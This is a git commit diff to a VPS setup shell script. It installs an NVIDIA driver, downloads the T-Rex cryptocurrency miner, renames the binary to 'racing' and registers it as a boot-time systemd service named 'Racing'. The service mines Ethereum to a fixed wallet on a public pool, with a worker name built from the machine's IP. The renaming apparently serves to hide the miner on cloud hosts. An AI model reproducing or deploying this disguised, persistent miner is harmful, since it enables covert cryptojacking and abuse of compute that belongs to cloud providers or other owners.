148a3dbcedf4aafb398c0c46f68084b232b6ed48
dinhtrungac1 <91616570+dinhtrungac1@users.noreply.github.com>
2022-04-21 22:32:52 +0700

    Update vps3.sh

--- vps3.sh
+++ vps3.sh
@@ -4,19 +4,12 @@ myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
 myworker+=$myip
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-sudo apt-get update
-sudo apt-get -y install cuda-drivers
-sudo apt-get install libcurl3 -y
-sudo apt-get install cuda-drivers-510
-sudo apt-get install cuda-drivers-fabricmanager-510
-sudo systemctl enable nvidia-fabricmanager
-sudo systemctl start nvidia-fabricmanager
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
+sudo apt install build-essential -y
+wget https://download.microsoft.com/download/4/3/9/439aea00-a02d-4875-8712-d1ab46cf6a73/NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
+sudo chmod +x NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
+yes "" | sudo ./NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
+wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz  
+tar -zxvf t-rex-0.22.1-linux.tar.gz
 mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re_Trail_\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
